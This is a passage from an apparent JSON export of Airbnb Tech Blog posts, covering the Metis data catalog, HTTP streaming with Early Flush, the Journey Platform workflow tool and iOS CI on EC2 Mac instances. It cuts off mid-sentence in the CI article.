components:Dataportal\u200a\u2014\u200aserves as a catalog and management UI for human\u00a0users.Viaduct\u200a\u2014\u200aAirbnb\u2019s in-house GraphQL API layer modeling offline data ecosystem.UMS Core service\u200a\u2014\u200aa backend service holding system schema and business logic needed for metadata management.Metadata storage:MySQL\u200a\u2014\u200aprimarily storing critical metadata that needs to be centrally managedLineage Graph\u200a\u2014\u200aa centralized service collecting and serving data\u00a0lineageElasticsearch\u200a\u2014\u200aserving search & discovery use\u00a0casesOffline Component\u200a\u2014\u200aexternal to UMS Core service to perform offline tasks: e.g. offline metadata consistency check, policy enforcement.Offline Dataset\u200a\u2014\u200aoffline export of metadata for analytics use\u00a0cases.DataportalDataportal serves as the UI for Airbnb\u2019s data catalog and is a place for people to find and manage all the assets supported by Metis. It\u2019s built as a Single Page Application using React and TypeScript and is therefore flexible enough to serve the large variety of workflows required for data management and governance. The frontend communicates with UMS and other services via a GraphQL API; this is especially important as we want to prevent both sequential fetches of lineage information and over-fetching large amounts of metadata to ensure a performant user experience.Search and DiscoveryThe Dataportal experience starts with search, so that both data consumers and data owners can find the assets they need. We\u2019ve designed our search and discovery experience with a few principles in\u00a0mind:Display relevant metadata directly in the search results to help people find the exact asset they\u2019re looking\u00a0forUprank high quality and commonly used data assets, in the case that the user is unaware of the exact asset they\u00a0needAs a result, search results tend to return high quality, certified datasets, along with the description, recent user count, and last time it was modified to help the user find which asset they want to\u00a0select:Dataportal search result\u00a0pageManagement CapabilitiesOnce the desired asset is located, the user can visit the Entity Page to perform a large variety of consumption, management, and governance actions. We structure all the content on the entity page into tabs grouped by category of data or\u00a0action:The many tabs available for metadata on Hive\u00a0TablesConsumption and documentation related tabs make it easy for people to learn how to use this table, with column and table descriptions in the Configuration tab, owner and consumer data on the Points of contact tab, and further details on how to use the table on the Documentation tab. Beyond that, these pages also allow users to take on management activities, as seen in the below screenshots:Anyone can tag columns that contain personal data. Changing and removing tags require a review to ensure that personal data is correctly identified in our warehouse.The above screenshot highlights only a subset of ways we leveled up the Dataportal from a searchable data catalog into the one centralized place to manage and govern all your data\u00a0assets.Unified Metadata\u00a0ServiceUnified Metadata Service, or UMS, is the backend core of our centralized data management platform. It provides:A centralized schema and Graphql API layer on top of it to access\u00a0metadataA centralized relationship graph to connect siloed\u00a0metadataCentralized metadata management capabilities to enable systems to meet compliance and governance requirements without reinventing the\u00a0wheelThe centralization of metadata into UMS prevents all metadata providers and consumers from needing to integrate with each other; instead all providers and consumers only must integrate with\u00a0UMS:Reducing integration points for\u00a0metadataMetadata Integration PatternsUMS plays various roles across metadata integrations and use cases. In a decentralized data ecosystem, we are very opinionated about what metadata should be stored, replicated to, or served through\u00a0UMS.Unified presentation layer proxying\u00a0requestsUMS supports proxying read requests to many data systems. This includes proxying read requests\u00a0to:Hive Metastore for table schema and table properties.Lineage service for raw Hive table data\u00a0lineage.Data Governance service for data governance status for datasets.Metadata management serviceUMS centrally manages a few critical business metadata and stores in its own metadata database with management capabilities:Validation and authorization for\u00a0updatesAudit historyApproval workflow for sensitive operations on critical\u00a0metadataSupporting online use cases for offline generated metadataAs part of Airbnb\u2019s Data Quality Initiative, we implemented data quality scores that are directly tied to each data asset in the data warehouse. Data quality scores for datasets are generated in an offline manner and ingested into UMS metadata database for online consumption.Centrally managed search indexes powering data discoverySimilar to traditional data catalog, UMS centrally manages indexes in an Elasticsearch cluster for different entities to power data discovery.Metadata IngestionThere are cases where metadata needs to be stored or replicated into Metis storage layer. UMS integrates with metadata providers in a variety of paved mechanisms to ingest metadata leveraging Airbnb\u2019s tech stack. These\u00a0include:Stream processing (Flink) jobs ingesting metadata change\u00a0events.ETL(Airflow) jobs that run daily to pull from metadata providers and push to\u00a0UMS.Direct calls to UMS\u00a0API.When we onboard a new metadata provider, the key work involved is identifying product requirements and aligning on the scope of metadata integration, followed by finalizing the actual integration mechanism.Lineage ServiceThe final major piece of Metis is our Lineage Service. We adopted Apache Atlas as Airbnb\u2019s data lineage solution for Data Warehouse back in\u00a02020.At Airbnb, Apache Atlas holds a large lineage graph containing over 100 million nodes and 300 million edges. The primary volume of lineage data comes from production Hive tables and a large volume of intermediate Hive tables in our Data Warehouse.We have extensively customized and tuned Apache Atlas to handle the large scale lineage events in our Data Warehouse:Apply sharding strategy on lineage events to increase parallelism.Improving Atlas server code efficiency on top of a graph database.Fine tuning underlying storage systems backing the graph database for scalability and\u00a0latency.Read path optimization and filtering support for accessing lineage data more efficiently.Atlas\u2019s lineage-related components, including its Graph Engine (JanusGraph), Type System, Ingest (with Hook integrations), and lineage API, have allowed us to efficiently collect and serve lineage data, providing valuable insights into the relationships between various data assets and pipelines. It is powering many critical data compliance, data reliability and data quality products. See Visualizing Data Timeliness at\u00a0Airbnb.Conclusion & AppreciationsAs shown above, Airbnb\u2019s approach to data management has significantly evolved over the past 6 years. We started building Dataportal with a goal to \u201cdemocratize data\u201d at Airbnb, and we now have Metis: a platform that enables anyone at Airbnb to search, discover, consume, and manage all the data and metadata in our offline warehouse. Metis has been serving critical roles across data compliance, data reliability, data quality initiatives and is helping 1000+ data users every\u00a0week.Our future work will involve two key priorities: firstly, we will focus on evolving our system architecture and underlying technology in order to keep pace with the rapid evolution of our data ecosystem. Secondly, we plan to expand our coverage to more systems and enable more advanced data management capabilities, reflecting our ongoing commitment to investing in data here at\u00a0Airbnb.Metis would not have been possible without the members of the data management team as well as our cross functional and cross org collaborators. They include, but are not limited to: Adam Kocoloski, Adam Wong, Cindy Yu, Dave Nagle, Erik Ritter, Jerry Wang, Jiaxin Ye, John Bodley, Jyoti Wadhwani, Liyin Tang, Michelle Thomas, Nathan Towery, Paul Ellwood, Sylvia Tomiyama, Vyl Chiang, Woody Zhou, Xiaobin Zheng, and Zuzana Vejrazkova.Apache Airflow, Apache Atlas, Apache Hive, Apache Superset, Atlas, and Hive are either registered trademarks or trademarks of The Apache Software Foundation in the United States and other countries.All trademarks, service marks, company names and product names are the property of their respective owners. Any use of these are for identification purposes only and do not imply sponsorship and endorsement.Metis: Building Airbnb\u2019s Next Generation Data Management Platform was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*HC0FvtGMOcsE3d138wRDRw.jpeg", "profile": 3, "updated_on": "2023-06-08T17:09:03Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12271.7708078, "slug": "metis-building-airbnbs-next-generation-data-management-platform-104", "topics": [33, 26, 34, 35, 32]}}, {"model": "app.post", "pk": 105, "fields": {"title": "Improving Performance with HTTP Streaming", "link": "https://medium.com/airbnb-engineering/improving-performance-with-http-streaming-ba9e72c66408?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/improving-performance-with-http-streaming-ba9e72c66408", "summary": "How HTTP Streaming can improve page performance and how Airbnb enabled it on an existing\u00a0codebaseBy: Victor\u00a0LinIntroductionYou may have heard a joke that the Internet is a series of tubes. In this blog post, we\u2019re going to talk about how we get a cool, refreshing stream of Airbnb.com bytes into your browser as quickly as possible using HTTP Streaming.Let\u2019s first understand what streaming means. Imagine we had a spigot and two\u00a0options:Fill a big cup, and then pour it all down the tube (the \u201cbuffered\u201d strategy)Connect the spigot directly to the tube (the \u201cstreaming\u201d strategy)In the buffered strategy, everything happens sequentially\u200a\u2014\u200aour servers first generate the entire response into a buffer (filling the cup), and then more time is spent sending it over the network (pouring it down). The streaming strategy happens in parallel. We break the response into chunks, which are sent as soon as they are ready. The server can start working on the next chunk while previous chunks are still being sent, and the client (e.g, a browser) can begin handling the response before it has been fully received.Implementing Streaming at\u00a0AirbnbStreaming has clear advantages, but most websites today still rely on a buffered approach to generate responses. One reason for this is the additional engineering effort required to break the page into independent chunks. This just isn\u2019t feasible sometimes. For example, if all of the content on the page relies on a slow backend query, then we won\u2019t be able to send anything until that query finishes.However, there\u2019s one use case that\u2019s universally applicable. We can use streaming to reduce network waterfalls. This term refers to when one network request triggers another, resulting in a cascading series of sequential requests. This is easily visualized in a tool like Chrome\u2019s Waterfall:Chrome Network Waterfall illustrating a cascade of sequential requestsMost web pages rely on external JavaScript and CSS files linked within the HTML, resulting in a network waterfall\u200a\u2014\u200adownloading the HTML triggers JavaScript and CSS downloads. As a result, it\u2019s a best practice to place all CSS and JavaScript tags near the beginning of the HTML in the <head> tag. This ensures that the browser sees them earlier. With streaming, we can reduce this delay further, by sending that portion of the <head> tag\u00a0first.Early FlushThe most straightforward way to send an early <head> tag is by breaking a standard response into two parts. This technique is called Early Flush, as one part is sent (\u201cflushed\u201d) before the\u00a0other.The first part contains things that are fast to compute and can be sent quickly. At Airbnb, we include tags for fonts, CSS, and JavaScript, so that we get the browser benefits mentioned above. The second part contains the rest of the page, including content that relies on API or database queries to compute. The end result looks like\u00a0this:Early chunk:<html>  <head>    <script src=\u2026 defer />    <link rel=\u201dstylesheet\u201d href=\u2026 />    <!--lots of other <meta> and other tags\u2026 ->Late chunk:<!-- <head> tags that depend on data go here ->  </head>  <body>    <! \u2014 Body content here \u2192  </body></html>We had to restructure our app to make this possible. For context, Airbnb uses an Express-based NodeJS server to render web pages using React. We previously had a single React component in charge of rendering the complete HTML document. However, this presented two problems:Producing incremental chunks of content means we need to work with partial/unclosed HTML tags. For example, the examples you saw above are invalid HTML. The <html> and <head> tags are opened in the Early chunk, but closed in the Late chunk. There\u2019s no way to generate this sort of output using the standard React rendering functions.We can\u2019t render this component until we have all of the data for\u00a0it.We solved these problems by breaking our monolithic component into\u00a0three:an \u201cEarly <head>\u201d componenta \u201cLate <head>\u201d component, for <head> tags that depend on\u00a0dataa \u201c<body>\u201d componentEach component renders the contents of the head or body tag. Then we stitch them together by writing open/close tags directly to the HTTP response stream. Overall, the process looks like\u00a0this:Write <html><head>Render and write the Early <head> to the\u00a0responseWait for\u00a0dataRender and write the Late <head> to the\u00a0responseWrite </head><body>Render and write the <body> to the\u00a0responseFinish up by writing </body></html>Data StreamingEarly Flush optimizes CSS and JavaScript network waterfalls. However, users will still be staring at a blank page until the <body> tag arrives. We\u2019d like to improve this by rendering a loading state when there\u2019s no data, which gets replaced once the data arrives. Conveniently, we already have loading states in this situation for client side routing, so we could accomplish this by just rendering the app without waiting for\u00a0data!Unfortunately, this causes another network waterfall. Browsers have to receive the SSR (Server-Side Render), and then JavaScript triggers another network request to fetch the actual\u00a0data:Graph showing a network waterfall where SSR and client-side data fetch happen sequentiallyIn our testing, this resulted in a slower total loading\u00a0time.What if we could include this data in the HTML? This would allow our server-side rendering and data fetching to happen in parallel:Graph showing SSR and client-side data fetch happening in\u00a0parallelGiven that we had already broken the page into two chunks with Early Flush, it\u2019s relatively straightforward to introduce a third chunk for what we call Deferred Data. This chunk goes after all of the visible content and does not block rendering. We execute the network requests on the server and stream the responses into the Deferred Data chunk. In the end, our three chunks look like\u00a0this:Early chunk<html>  <head>    <link rel=\u201dpreload\u201d as=\u201dscript\u201d href=\u2026 />    <link rel=\u201dstylesheet\u201d href=\u2026 />    <! \u2014 lots of other <meta> and other tags\u2026 \u2192Body chunk    <! \u2014 <head> tags that depend on data go here \u2192  </head>  <body>     <! \u2014 Body content here \u2192     <script src=\u2026 />Deferred Data\u00a0chunk    <script type=\u201dapplication/json\u201d >      <!-- data -->    </script>   </body></html>With this implemented on the server, the only remaining task is to write some JavaScript to detect when our Deferred Data chunk arrives. We did this with a MutationObserver, which is an efficient way to observe DOM changes. Once the Deferred Data JSON element is detected, we parse the result and inject it into our application\u2019s network data store. From the application\u2019s perspective, it\u2019s as though a normal network request has been completed.Watch out for\u00a0`defer`You may notice that some tags are re-ordered from the Early Flush example. The script tags moved from the Early chunk to the Body chunk and no longer have the defer attribute. This attribute avoids render-blocking script execution by deferring scripts until after the HTML has been downloaded and parsed. This is suboptimal when using Deferred Data, as all of the visible content has already been received by the end of the Body chunk, and we no longer worry about render-blocking at that point. We can fix this by moving the script tags to the end of the Body chunk, and removing the defer attribute. Moving the tags later in the document does introduce a network waterfall, which we solved by adding preload tags into the Early\u00a0chunk.Implementation ChallengesStatus codes and\u00a0headersEarly Flush prevents subsequent changes to the headers (e.g to redirect or change the status code). In the React + NodeJS world, it\u2019s common to delegate redirects and error throwing to a React app rendered after the data has been fetched. This won\u2019t work if you\u2019ve already sent an early <head> tag and a 200 OK\u00a0status.We solved this problem by moving error and redirect logic out of our React app. That logic is now performed in Express server middleware before we attempt to Early\u00a0Flush.BufferingWe found that nginx buffer responses by default. This has resource utilization benefits but is counterproductive when the goal is sending incremental responses. We had to configure these services to disable buffering. We expected a potential increase in resource usage with this change but found the impact to be negligible.Response delaysWe noticed that our Early Flush responses had an unexpected delay of around 200ms, which disappeared when we disabled gzip compression. This turned out to be an interaction between Nagle\u2019s algorithm and Delayed ACK. These optimizations attempt to maximize data sent per packet, introducing latency when sending small amounts of data. It\u2019s especially easy to run into this issue with jumbo frames, which increases maximum packet sizes. It turns out that gzip reduced the size of our writes to the point where they couldn\u2019t fill a packet, and the solution was to disable Nagle\u2019s algorithm in our haproxy load balancer.ConclusionHTTP Streaming has been a very successful strategy for improving web performance at Airbnb. Our experiments showed that Early Flush produced a flat reduction in First Contentful Paint (FCP) of around 100ms on every page tested, including the Airbnb homepage. Data streaming further eliminated the FCP costs of slow backend queries. While there were challenges along the way, we found that adapting our existing React application to support streaming was very feasible and robust, despite not being designed for it originally. We\u2019re also excited to see the broader frontend ecosystem trend in the direction of prioritizing streaming, from @defer and @stream in GraphQL to streaming SSR in Next.js. Whether you\u2019re using these new technologies, or extending an existing codebase, we hope you\u2019ll explore streaming to build a faster frontend for\u00a0all!If this type of work interests you, check out some of our related positions here.AcknowledgmentsElliott Sprehn, Aditya Punjani, Jason Jian, Changgeng Li, Siyuan Zhou, Bruce Paul, Max Sadrieh, and everyone else who helped design and implement streaming at\u00a0Airbnb!****************All product names, logos, and brands are property of their respective owners. All company, product and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.Improving Performance with HTTP Streaming was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*q2A2ZjnULygCKIWuiSBKXg.jpeg", "profile": 3, "updated_on": "2023-05-17T16:48:22Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12229.50323, "slug": "improving-performance-with-http-streaming-105", "topics": [36, 37, 38, 26, 27]}}, {"model": "app.post", "pk": 106, "fields": {"title": "Journey Platform: A low-code tool for creating interactive user workflows", "link": "https://medium.com/airbnb-engineering/journey-platform-a-low-code-tool-for-creating-interactive-user-workflows-9954f51fa3f8?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/journey-platform-a-low-code-tool-for-creating-interactive-user-workflows-9954f51fa3f8", "summary": "Journey Platform: Low-code notification workflow platform that allows technical and non-technical users to create complex workflows through a simple drag and drop user interface.By: Arjun Raman, Ken Snyder, Mengting\u00a0LiIntroductionEffective communication hinges on delivering the right message, to the right audience, at the right time. At Airbnb, our goal is to engage our users\u200a\u2014\u200aboth guests and hosts\u200a\u2014\u200aby delivering inspirational and informational notifications through various channels, such as email or in-app messages.Historically at Airbnb, complex notification workflows have been solely managed by engineering teams, with each workflow requiring the deployment of code. As our platform evolved, we recognized the need for a low-code or no-code solution to streamline the creation of these intricate notification workflows. In response, the Marketing Technology team developed the Journey Platform, a powerful tool that enables non-technical users to build and deliver personalized notifications based on our users\u2019 engagement with\u00a0Airbnb.The goals of the Journey Platform\u00a0are:Empower users to easily create event-driven notification workflows using an intuitive drag and drop interface.Enable real-time execution of these notification workflows for timely and relevant communication.Offer a unified interface for managing transaction notifications, such as upcoming trip reminders and promotional notifications.Guarantee Service Level Agreements (SLAs) for processing various types of notification workflows, including transactional and promotional communications.Reduce the time required to develop complex notification workflows.Journey Platform allows users to iterate faster by allowing self-serve workflow creation. It has reduced the time taken to support a new use-case from 1\u20132 months to just 1\u20132\u00a0weeks.Figure 1: Time saved in Journey\u00a0PlatformOverviewFigure 2: Journey Platform architecture overviewThe key components of the Journey Platform\u00a0are:Journey Platform UI: WYSIWYG tool allows users to drag and drop components and create a workflow. The workflow definition is then converted to a custom DSL (Domain-specific language) which can be interpreted and executed by the workflow orchestrator.Workflow Orchestrator: Brain of the system, the workflow orchestrator takes in the workflow definition DSL from the UI. Once a workflow is launched, it listens for events from the event store that can start the execution of a workflow, interprets then parses the DSL to execute workflows on the workflow engine, and relies on the Action store to perform specific\u00a0tasks.Platform Store:Event Store: Pre-configured catalog of Kafka events which Journey Platform can listen to and trigger new executions of a workflow or pass events to existing workflow execution.Action store: Repository of predefined, specific-purpose functions allows users to perform various tasks, such as sending emails, push notifications, or emitting Kafka events. Custom actions can be defined and integrated into the tool, making them accessible to all Journey Platform\u00a0users.Attribute store: Central repository for essential data, such as user metadata (e.g. user\u2019s geolocation, Airbnb search history, etc.) and contextual information. It supports decision-making in workflow branching processes by exposing these data as a parameter to set conditions upon through the parameter manager.Custom stores: Ability to create custom action or attribute stores which aren\u2019t already defined in the platform.Workflow Orchestrator: Brain of the system, the workflow orchestrator takes in the workflow definition DSL from the UI. Once a workflow is launched, it listens for events from the event store that can start the execution of a workflow, interprets then parses the DSL to execute workflows on the workflow engine, and relies on the Action store to perform specific\u00a0tasks.User InterfaceFigure 3: Manipulating and connecting nodes in a Journey Platform\u00a0workflowWhen crafting the UI for the workflow automation system, we aimed to create a familiar and intuitive experience. Drawing inspiration from flow charts, productivity tools with \u201cinspector panels,\u201d and incorporating drag and drop functionality, we wanted a platform where users could start immediately without consulting the\u00a0manual.We also had a goal of using progressive disclosure to incrementally enable the full depth of the platform capabilities, while keeping it simple for users who only need a small subset of the features. By using sensible defaults, and moving more complex features into tabs and sub-screens, our advanced users could create unique solutions, going beyond the pre-planned use\u00a0cases.To edit the graph, we leveraged React Flow, an open-source library. This enabled us to display the graph, as well as provide basic operations like zooming, panning, moving, and connecting nodes. On top of this foundation, we added our custom node and edge components, along with drag and drop functionality for adding new nodes and an inspector panel for editing existing\u00a0ones.Figure 4: The \u201cnode inspector\u201d panel can show a variety of form inputs depending on the type of\u00a0node.To create the forms displayed in the inspector panel, we implemented a schema-based form system. This system provides a high level of flexibility, allowing us to declaratively specify the UI for specific node input/output fields as part of their type definitions. The system is built in a type-safe manner, making use of Thrift annotations and Java reflection. Based on the schema information and UI-specific annotations, the interface displays the appropriate form fields, help text, and validation, ensuring our UI is automatically up-to-date with the platform\u2019s capabilities.Backend DesignDomain-specific languageDSL provides a high degree of flexibility and customization, allowing us to define the structure and behavior of the workflow. Instead of having to hardcode a workflow in the workflow engine, we instead have a generic workflow defined that can execute any DSL-based workflow. Nodes and edges make up a workflow, with nodes representing individual actions or tasks and edges defining the dependencies and relationships between\u00a0them.The nodes and edges include all the necessary information to define a workflow such as inputs, outputs, and parameters passed between nodes. The DSL generated by the UI is passed to the workflow orchestrator, where the DSL parser executes\u00a0it.Figure 5: Workflow with the translated DSLhttps://medium.com/media/f463cc81d674bab88ed62f63cb785f95/hrefJourney StoresThe events, attributes, and actions stores are an integral part of the backend, as they allow listening to events to start workflow executions, filter users, and execute tasks in the journey. All these components work together seamlessly to create a flexible and customizable backend that can be tailored to the specific needs of the platform.Event StoreJourney Platform supports listening to different Kafka events and using them to trigger new executions of a workflow, or use the event to pass signals to a running execution. For example, start a new execution when a guest books a stay, pass a signal to a running execution when a user receives a push notification, etc. Similar to the action store, once an event is on-boarded, all the teams at Airbnb can use\u00a0it.Figure 6: Start node with event\u00a0triggerAttribute StoreThe attribute store functions as a central repository for fetching all necessary data, such as contextual data, user preferences, and device information, which can be used to enrich the workflow branching process and improve decision-making capabilities. These stores are supported by a data storage system that manages various attributes or characteristics of entities.Imagine you have a new user who just signed up for Airbnb, and you\u2019re interested in determining whether they\u2019ve conducted any listing searches on the platform. If the answer is yes, you\u2019ll send a personalized message based on their search history, and if it\u2019s no, you\u2019ll send a static\u00a0message.This is a concrete example of how the Airbnb Journey Platform leverages attributes, such as \u201clisting search history,\u201d to enhance the user experience. These attributes are extracted and defined as parameters, which can be used for various purposes. Each workflow execution has its own parameter data collection, which can be accessed in the parameter manager. More information about parameters will be discussed in the parameter manager.Figure 7: Setting filter condition using the attribute storeAction StoreThe action store is used to execute various tasks, such as sending an email or updating a database record, when a user reaches a specific point in the journey. It is a common library where each function can be shared and reused by different users in their workflow.Figure 8: Example Actions supported in Journey platform.Each action implements a common interface, including its metadata required for the UI schema-based forms mentioned above, and its behavior during the actual workflow execution.https://medium.com/media/19e90453917bfbda2d93d2bdbc813e19/hrefParameter ManagerManaging a complex workflow that involves multiple steps with varying inputs and outputs can be a challenging task, especially if the input and output parameters change frequently or are different for each user. For instance, you might need conditional branching in your workflow or personalized communication content based on user search. This is where parameterized workflows and parameter managers can prove to be invaluable components.By specifying inputs and outputs (of attribute node / event node / custom node) as parameters, you can reuse them throughout the entire workflow execution. A parameter manager is a critical component that can store and manage your workflow parameters, streamlining the process of creating, storing, retrieving, and modifying them.In addition to providing an efficient parameter management system, a parameter manager also provides a range of features such as parameter creation, storage, retrieval, modification, versioning, access control, and auditing. These features ensure that your workflow is executed reliably and consistently while also properly managing and storing your parameters throughout the entire workflow.Figure 9: Adding a param from the parameter libraryWorkflow OrchestratorThe Workflow Orchestrator executes workflows by interpreting the meaning of each DSL node and performing the corresponding actions. It manages low-level functions such as storing state, interacting with the action store to perform an action, listening for callbacks through the event store, and allowing developers to concentrate on workflow logic rather than technical details. Journey Platform utilizes Temporal as the underlying workflow engine for state maintenance and orchestration. Temporal helps orchestrate workflows through Temporal\u00a0Workers.https://medium.com/media/c11d9da913e56545a771659b6576f44c/hrefDevelopers can incorporate custom functionality such as new nodes or edges to broaden platform capabilities, making it simpler to create workflows that fulfill the platform\u2019s and users\u2019 unique requirements. Additionally, it supports advanced features like parallel execution and automatic retries and enhancing platform reliability and performance.Figure 10: Workflow OrchestratorScaling the\u00a0systemFigure 11: Multi-tenant system with dedicated processing lanesEnsuring SLA for processing different types of workflows (i.e. transactional and promotional) is critical at scale. Transactional notifications initiated by user action (e.g. booking confirmation, guest/Host messaging, etc.) have a strict SLA and require higher priority when compared to promotional notifications. To achieve this, we have implemented the following at different parts of the\u00a0system:Event pre-processing:Pre-filter: Instead of passing all the events directly to the Workflow Handler, the event processor filters out events that don\u2019t match the criteria. e.g. only pass if the event type is reservation_complete and filter out for all other reservation events. This greatly reduces the QPS feeding into the\u00a0system.Aggregate high QPS events: Events like searches have a high QPS. Instead of directly processing, we batch and aggregate them over a time window. This reduces the QPS by at least a few orders of magnitude.Dedicated lanes:We have dedicated lanes for different categories of workflows through the system. The event listener has different consumer groups with built-in throttling. The workflow handler has dedicated Temporal namespaces for each category and strict limits on the processing QPS, max QPS to the database, etc.ConclusionThe Journey Platform empowers non-technical and technical users to create complex stateful workflows through a simple drag and drop interface. By leveraging a generic workflow definition DSL, along with action store, event store, and attribute store, the platform facilitates the creation of workflows that respond to real-time events, streamlining communication, and enhancing user experiences.Interested in working at Airbnb? Check out these open\u00a0roles.AcknowledgmentsThanks to Balaji Kalaimani, Davis Wamola, Iris Feng, Jesse Garrison, John Bernardo, Kumar Arjunan, Michael Endelman, Priyank Singhal, Steve Krulewitz, Tej Sudha, Victoria Gryn, Xin Tu, and Zhentao Sun for their contributions in building Journey Platform.Thanks to Sagar Naik and Michael Kinoti for their leadership and supporting us in this\u00a0Journey.****************All product names, logos, and brands are property of their respective owners. All company, product and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.Journey Platform: A low-code tool for creating interactive user workflows was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*rLBEt8kz__tykm6lCLxDtQ.jpeg", "profile": 3, "updated_on": "2023-05-11T19:13:03Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12218.1761411, "slug": "journey-platform-a-low-code-tool-for-creating-interactive-user-workflows-106", "topics": [26, 35, 32, 27]}}, {"model": "app.post", "pk": 107, "fields": {"title": "Flexible Continuous Integration for iOS", "link": "https://medium.com/airbnb-engineering/flexible-continuous-integration-for-ios-4ab33ea4072f?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/flexible-continuous-integration-for-ios-4ab33ea4072f", "summary": "How Airbnb leverages AWS, Packer, and Terraform to update macOS on hundreds of CI machines in hours instead of\u00a0daysBy: Michael Bachand, Xianwen\u00a0ChenAt Airbnb, we run a comprehensive suite of continuous integration (CI) jobs before each iOS code change is merged. These jobs ensure that the main branch remains stable by executing critical developer workflows like building the iOS application and running tests. We also schedule jobs that perform periodic tasks like reporting metrics and uploading artifacts.Many of our iOS CI jobs execute on Macs, which enables running developer tools provided by Apple. CI jobs for all other platforms at Airbnb execute in containers on Amazon EC2 Linux instances. To fulfill the macOS requirement of iOS CI jobs we have historically maintained alternate CI infrastructure outside of AWS specifically for iOS development. The introduction of Macs to AWS provided an opportunity for us to rethink our approach to iOS\u00a0CI.We designed the next iteration of our iOS CI system in late 2021, finished the migration to the new system in mid 2022, and polished the system through the end of 2022. CI for iOS and all other platforms at Airbnb already leveraged Buildkite for dispatching jobs. Now, we deploy iOS CI infrastructure to AWS using Terraform, which helps align CI for iOS with CI for other platforms at\u00a0Airbnb.In this article, we are excited to share with you details of the flexible and easy-to-maintain iOS CI system that we\u2019ve implemented with Amazon EC2 Mac instances.The Challenges with Running CI on Physical\u00a0MacsHistorically we ran Airbnb iOS CI on physical Macs. We enjoyed the speed of running CI without virtualization but we paid a substantial maintenance cost to run CI jobs directly on physical hardware. An iOS infrastructure engineer individually logged into over 300 machines to perform administrative tasks like enrolling the Mac in our MDM (Mobile Device Management) tool and upgrading macOS. Manual maintenance requirements limited the scalability of the fleet and consumed engineer time that could be better spent on higher-value projects.An engineer remotely updates multiple physical Macs to macOS Big Sur. EC2 macOS AMIs have eliminated this manual\u00a0work.Our old CI machines were rarely restarted and too often drifted into a bad state. When this occurred, the best-case scenario was that an engineer could log into the machine, diagnose what configuration drift was causing issues, and manually bring the machine back to a good state. More commonly, we shut down the corrupted machine so that it could no longer accept new CI jobs. Periodically, we asked the vendor who managed our physical Macs to restore the corrupted machines to a clean installation of macOS. When the machines eventually came back online, we manually re-enrolled each machine in MDM to bring our fleet back to its full capacity.Updating to a new version of Xcode was quite error-prone as well. We strive to roll out new Xcode versions regularly since many iOS engineers at Airbnb follow Swift and Xcode releases closely and are eager to adopt new language features and IDE improvements. However, the fixed capacity of our Mac fleet made it difficult for us to verify iOS CI jobs thoroughly against new versions; any machine allocated to testing a new version of Xcode could no longer accept CI jobs from the previous Xcode version. The risk of tackling each Xcode update was increased by the fact that rolling back to a previous version of Xcode across our fleet was not practical.Upgrading CI with Custom macOS\u00a0AMIsWhen evaluating AWS, we were excited by the possibility of launching instances from Amazon Machine Images (AMIs). An AMI is a snapshot of an instance\u2019s state, including its file system contents and other metadata. Amazon provides base AMIs for each macOS version and allows customers to create their own AMIs from running instances.AMIs allow us to add new instances to our fleet without human intervention. An EC2 Mac bare-metal instance launched from a properly configured AMI is immediately ready to accept new work after initialization. When updating macOS, we no longer need to log into every machine in our fleet. Instead, we log into a single instance launched from the Amazon base AMI for the new macOS version. After performing a handful of manual configuration steps, like enabling automatic login, we create an Airbnb base AMI from that instance.Initially, we powered our EC2 Mac fleet with manually created AMIs. An engineer would configure a single instance and create an AMI from that instance\u2019s state. Then we could launch any number of additional instances from that AMI. This was a major improvement over managing physical machines since we could spin up an entire fleet of identical instances after configuring only a single instance successfully.Now, we build AMIs using Packer. Packer programmatically launches and configures an EC2 instance using a template defined in the HashiCorp configuration language (HCL). Packer then creates an AMI from the configured EC2 instance. A Ruby wrapper script invokes Packer consistently and performs helpful validations like checking that the user has assumed the proper AWS role. We check the HCL template code into source control and all changes to our Packer template and companion scripts are made via GitHub pull requests.https://medium.com/media/9a7e7156ed43dd4c13caecec5b9eb003/hrefWe initially ran Packer from developer laptops, but the laptop needed to be awake and online for the duration of the Packer build. Eventually, we created a dedicated pipeline to build AMIs in the cloud. A developer can trigger a new build on this pipeline with a couple of clicks. A successful build will produce freshly baked and verified AMIs for both the x86 and Arm (Apple Silicon) CPU architectures within a few\u00a0hours.Defining CI Environments in TerraformOur new CI system leveraging these AMIs consists of many environments, each of which can be managed independently. The central AWS component of each CI environment is an Auto Scaling group, which is responsible for launching the EC2 Mac instances. The number of instances in the Auto Scaling group is determined by the desired capacity property on the group and is bounded by min and max size properties.An Auto Scaling group creates new instances using a launch template. The launch template specifies the configuration of each instance, including the AMI, and allows a \u201cuser data\u201d script to run when the instance is launched. Launch templates can be versioned, and each Auto Scaling group is configured to launch instances from a specific version of its launch template.Although the introduction of environments has made our CI topology more complex, we find that complexity manageable when our infrastructure is defined in code. All of our AWS infrastructure for iOS CI is specified in Terraform code that we check into source control. Each time we merge a pull request related to iOS CI, Terraform Enterprise will automatically apply our changes to our AWS account. We have defined a Terraform module that we can call whenever we want to instantiate a new CI environment.https://medium.com/media/83f558d48b5ae1feeb14fa09aec06aea/hrefAn internal scaling service manages the desired capacity of each environment\u2019s Auto Scaling group. This service, a modified fork of buildkite-agent-scaler, increases the desired capacity of an environment\u2019s Auto Scaling group as CI job volume for that environment increases. We specify a maximum number of instances for each CI environment in part because On-Demand EC2 Mac Dedicated Hosts currently have a minimum host allocation and billing duration of 24\u00a0hours.A sketch of Airbnb\u2019s new iOS CI\u00a0system.Each CI environment has a unique Buildkite queue name. Individual CI jobs can target instances in a specific environment by specifying the corresponding queue name. Jobs will fall back to the default CI environment when no queue name is explicitly 